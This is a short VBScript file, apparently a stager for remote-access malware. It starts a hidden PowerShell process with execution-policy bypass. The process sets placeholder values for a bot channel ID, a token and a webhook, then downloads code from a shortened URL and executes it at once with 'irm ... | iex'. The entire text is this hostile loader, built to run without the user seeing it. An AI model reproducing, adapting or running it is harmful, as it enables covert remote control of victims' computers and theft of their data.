Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex", 0, True

